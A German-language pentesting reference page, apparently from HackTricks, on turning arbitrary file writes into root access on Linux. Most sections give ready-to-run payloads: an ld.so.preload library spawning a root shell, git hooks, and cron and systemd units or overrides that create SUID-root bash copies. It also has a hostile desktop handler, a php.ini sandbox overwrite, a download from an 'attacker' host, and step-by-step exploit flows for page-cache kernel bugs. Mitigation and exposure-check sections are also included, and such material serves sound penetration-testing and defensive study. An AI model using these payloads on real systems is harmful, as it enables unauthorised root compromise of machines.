# Beliebiges Schreiben in Dateien als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ist eine systemweite Liste gemeinsam genutzter Objekte, die der dynamische Linker vor anderen gemeinsam genutzten Objekten lädt. Der Secure-Execution-Modus wendet zusätzliche Einschränkungen auf das Preloading an, daher ist ein Bibliothekspfad wie `/tmp/pe.so` keine universelle Technik für SUID-Binärdateien.\
Wenn du die Datei erstellen oder ändern kannst, lädt ein Prozess, der die Datei lädt, die angegebene Bibliothek vor seinen anderen gemeinsam genutzten Objekten, wodurch Codeausführung im Kontext dieses Prozesses möglich wird.<sup>[[12]](#references)</sup>

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** sind ausführbare Scripts, die bei Ereignissen in einem Repository ausgeführt werden, einschließlich Commit- und Merge-Vorgängen. Wenn ein **privileged script oder user** diese Aktionen ausführt und ein Angreifer in den **`.git`-Ordner** schreiben kann, kann der Hook zur **privilege escalation** verwendet werden.<sup>[[13]](#references)</sup>

Zum Beispiel ist es möglich, ein **Script** in einem Git-Repository unter **`.git/hooks`** zu **erstellen**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron- und Zeitdateien

Wenn du **in cron-bezogene Dateien schreiben kannst, die von root ausgeführt werden**, kannst du normalerweise bei der nächsten Ausführung des Jobs Code ausführen. Interessante Ziele sind unter anderem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Die eigene crontab von root in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen ausgelösten Services

Schnelle Überprüfungen:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchswege:

- **Einen neuen root-Cronjob anhängen** an `/etc/crontab` oder eine Datei in `/etc/cron.d/`
- **Ein bereits von `run-parts` ausgeführtes Script ersetzen**
- **Ein vorhandenes Timer-Ziel mit einer Backdoor versehen**, indem das von ihm gestartete Script oder Binary geändert wird

Minimales Beispiel für ein Cron-Payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn du nur in ein von `run-parts` verwendetes Cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notizen:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten. Verwende daher bevorzugt Namen wie `backup` statt `backup.sh`.<sup>[[15]](#references)</sup>
- Einige Systeme verwenden `systemd`-Timer anstelle des klassischen cron, aber die Idee des Missbrauchs ist dieselbe: **ändere, was root später ausführen wird**.<sup>[[20]](#references)</sup>

### Service- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder von ihnen referenzierte Dateien beschreiben kannst, ist es möglicherweise möglich, durch das Neuladen und Neustarten der Unit oder durch das Warten auf die Aktivierung des Service-/Socket-Pfads Code als root auszuführen.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Überschreibungen in `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/-Binärdateien, auf die von `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwiesen wird
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnellprüfungen:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer Root-eigenen Service-Unit, die du ändern kannst
- **Einen Drop-in-Override hinzufügen** mit einem bösartigen `ExecStart=` und den alten Eintrag vorher löschen
- Das **Backdoor**-Skript bzw. die **Backdoor**-Binärdatei, auf die die Unit bereits verweist
- Einen **Socket-aktivierten Service hijacken**, indem du die entsprechende `.service`-Datei änderst, die gestartet wird, sobald der Socket eine Verbindung empfängt

Beispiel für einen bösartigen Override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Dienste nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten kannst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, um die Ausführung des manipulierten Dienstes als root auszulösen.<sup>[[17]](#references)</sup>

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons validieren von Benutzern bereitgestelltes PHP, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der sandboxed Code weiterhin über **irgendeine Schreibmöglichkeit** (wie `file_put_contents`) verfügt und du den **genauen `php.ini`-Pfad** erreichen kannst, kannst du diese Konfiguration **überschreiben**, um die Einschränkungen aufzuheben, und anschließend einen zweiten Payload übermitteln, der mit erhöhten Berechtigungen ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Der erste Payload überschreibt die Sandbox-Konfiguration.
2. Der zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der daemon als root ausgeführt wird (oder mit root-eigenen Pfaden validiert), liefert die zweite Ausführung einen root-Kontext. Dies ist im Wesentlichen eine **Privilege Escalation via Config Overwrite**, wenn die sandboxed Runtime weiterhin Dateien schreiben kann.

### binfmt_misc

`binfmt_misc` stellt Registrierungen unter `/proc/sys/fs/binfmt_misc` bereit; jede Registrierung ordnet einem Dateitymuster einen Interpreter zu. Die Auswirkungen auf Privilegien hängen davon ab, wer die Registrierung ändern kann und welcher Prozess später die entsprechende Datei ausführt. Überprüfe diese Voraussetzungen daher, bevor du dies als möglichen Privilege-Escalation-Pfad einstufst.<sup>[[21]](#references)</sup>

### Schema-Handler überschreiben (wie http: oder https:)

Desktop-Umgebungen verwenden MIME associations und desktop entries, um eine Anwendung für URI-Schemes auszuwählen. Ein Angreifer, der die relevanten benutzerspezifischen Konfigurations- und Desktop-Entry-Verzeichnisse schreiben kann, kann diese Schemes zu einem von ihm kontrollierten Launcher umleiten. Durch Ändern der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine schädliche Datei verweisen (z. B. `x-scheme-handler/http=evil.desktop` und `x-scheme-handler/https=evil.desktop`), kann ein Benutzerklick diesen Desktop entry aufrufen.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root führt benutzerschreibbare Scripts/Binaries aus

Wenn ein privilegierter Ablauf etwas wie `/bin/sh /home/username/.../script` ausführt (oder eine beliebige Binary innerhalb eines Verzeichnisses, das einem unprivilegierten Benutzer gehört), kannst du es hijacken:<sup>[[1]](#references)</sup>

- **Die Ausführung erkennen:** Überwache Prozesse mit pspy, um zu erkennen, wann root benutzerkontrollierte Pfade aufruft.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören und für ihn beschreibbar sind.
- **Ziel übernehmen:** Sichere die ursprüngliche Binary bzw. das ursprüngliche Script und hinterlege ein Payload, das eine SUID-Shell (oder eine andere Root-Aktion) erstellt. Stelle anschließend die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. eine UI-Schaltfläche drücken, die den Helper startet). Wenn root den hijacked path erneut ausführt, die eskalierte Shell mit `./rootshell -p` übernehmen.

### Nur den Page Cache betreffende Dateimodifikation privilegierter Binaries

Einige Kernel-Bugs modifizieren die Datei **nicht auf der Festplatte**. Stattdessen erlauben sie nur die Modifikation der **Page-Cache-Kopie** einer lesbaren Datei. Wenn ein **setuid**- oder anderweitig **von root ausgeführtes** Binary als Ziel gewählt werden kann, führt die nächste Ausführung möglicherweise vom Angreifer kontrollierte Bytes aus dem Speicher aus und eskaliert die Privilegien, obwohl der Dateihash auf der Festplatte unverändert ist.<sup>[[3]](#references)[[4]](#references)</sup>

Dies lässt sich als **Runtime-only-Datei-Schreibprimitive** betrachten:<sup>[[3]](#references)</sup>

- **Die Festplatte bleibt sauber**: Inode und Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Page lesen oder ausführen, erhalten den vom Angreifer modifizierten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder der Verdrängung aus dem Cache

Diese Primitive liegt zwischen dem klassischen **arbitrary file write** und älteren **page-cache abuse**-Bugs wie Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW beruhte auf einer Race Condition
- Dirty Pipe hatte Einschränkungen bei der Schreibposition
- Eine Page-Cache-only-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibzugriffe in gecachte, dateigestützte Pages ermöglicht

#### Generischer privesc-Ablauf

1. Eine Kernel-Primitive erhalten, die in **dateigestützte Page-Cache-Pages** schreiben kann
2. Sie gegen ein **lesbares privilegiertes Binary** oder eine andere von root ausgeführte Datei einsetzen
3. Die Ausführung **starten, bevor** die Page aus dem Cache verdrängt wird
4. Codeausführung als root erhalten, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische Ziele mit hohem Wert:

- **setuid-root**-Binaries
- Helper, die von **root services** gestartet werden
- Binaries, die häufig aus **Containern mit gemeinsamem Host-Kernel/Page Cache** ausgeführt werden

#### AF_ALG + `splice()`-Beispielpfad

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad befand sich in der Linux-Krypto-Userspace-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Pages aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- der In-Place-`algif_aead`-Decrypt-Pfad verwendete Source- und Destination-Buffer wieder
- `authencesn` schrieb anschließend in die Destination-Tag-Region
- wenn diese Region weiterhin auf dateigestützte, per `splice` eingebundene Pages verwies, landete der Schreibzugriff im **Page Cache der Zieldatei**

Die interessante Technik ist daher nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als beschreibbaren Output zu **behandeln**
- eine kleine, kontrollierte Überschreibung im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibzugriffe**, um `/usr/bin/su` im Speicher zu patchen, und führte es anschließend aus.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter-TEE-Clone-Beispielpfad

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **page-cache-only write-to-root**-Musters, diesmal jedoch mit **IPsec-ESP-decrypt** anstelle von `AF_ALG` als Sink.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die wichtige Technik ist der Schritt des **metadata laundering**:

- `splice()` platziert eine **schreibgeschützte, dateigestützte Page-Cache-Page** in einem ESP-in-UDP-Paket
- die ursprüngliche DirtyFrag-Mitigierung markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` vor dem Decrypten **kopiert**
- netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- der Clone behält dieselbe **physische Page-Cache-Referenz**, verliert jedoch `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Clone anschließend als sicher und führt den **In-Place-Decrypt von `cbc(aes)`** über die dateigestützte Page aus

Die Lehre für Reviewer geht daher über die CVE hinaus: Wenn eine Mitigierung von **skb-/Page-Metadaten** abhängt, um zu entscheiden, ob eine Operation zuerst kopieren muss, kann jeder **Clone-/Copy-Pfad, der die zugrunde liegende Page beibehält, aber die Metadaten entfernt**, die Schreibprimitive unbemerkt erneut öffnen.

Typischer Exploit-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ausführen, um **`CAP_NET_ADMIN` innerhalb eines privaten Network Namespace** zu erhalten
2. Loopback aktivieren und eine **netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. XFRM-ESP-Transport-SAs über `NETLINK_XFRM` installieren
4. jedes anvisierte 4-Byte-Word im SA-Feld `seq_hi` kodieren (DirtyFrags Trick zur Auswahl des Words)
5. das gesplicte ESP-in-UDP-Paket senden, sodass der **TEE-Clone** `esp_input()` erreicht und den Decrypt **in place** ausführt
6. wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einer anderen privilegierten ausführbaren Datei vom Angreifer kontrollierten Code enthält

Operativ ist die Auswirkung dieselbe wie im `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt sauber, aber `execve()` verwendet die **veränderten Page-Cache-Bytes** und liefert root.<sup>[[8]](#references)[[9]](#references)</sup>

Nützliche Exposure-Checks für diese Variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Die kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den clone path, während das Blockieren des Autoloadings von `xt_TEE` den **flag-laundering step** entfernt und das Blockieren von `esp4` / `esp6` den **decrypt sink** entfernt.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure und Hunting

Wenn Sie diese Bug-Klasse vermuten, verlassen Sie sich nicht nur auf Prüfungen der Festplattenintegrität. Überprüfen Sie außerdem:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Die folgenden Konfigurationswerte unterscheiden eine ladbare Schnittstelle von einer in den Kernel integrierten Schnittstelle; die Crypto-Build-Regeln ordnen `CONFIG_CRYPTO_USER_API_AEAD` `algif_aead` zu.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen und entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: die Schnittstelle ist in den Kernel integriert
- setuid-Binaries sind gute Ziele, da ein Patch, der nur den Page Cache betrifft, aus einem lokalen Foothold einen Root-Zugriff machen kann

#### Reduzierung der Angriffsfläche für den `algif_aead`-Pfad

Wenn die verwundbare Schnittstelle von einem ladbaren Modul bereitgestellt wird:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Wenn es in den Kernel kompiliert wird, berichteten einige Offenlegungen, dass der init-Pfad blockiert wird:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Diese Art von Mitigation sollte auch bei anderen Kernel-LPEs berücksichtigt werden: Wenn die Ausnutzung von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Blacklisting dieser Schnittstelle den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – Hijacking eines als root ausgeführten Scripts in einem benutzerbeschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-Veröffentlichung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-stable-Fix: crypto: algif_aead – Zurück zum Out-of-Place-Betrieb](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail – CVE-2026-31431-Advisory](https://copy.fail/)
- [7] [Technischer Write-up von Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und Ausnutzung der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Mitigation: `SKBFL_SHARED_FRAG` für gesplicte UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) – Debian-Handbuchseite](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc – Die Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Zuordnungen von MIME-Anwendungen](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Spezifikation für Shared MIME-Info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Spezifikation für Desktop-Einträge](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-Sprache](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux-Krypto-Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux-Kernel-AF_ALG-Page-Cache-Schwachstelle](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) – Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
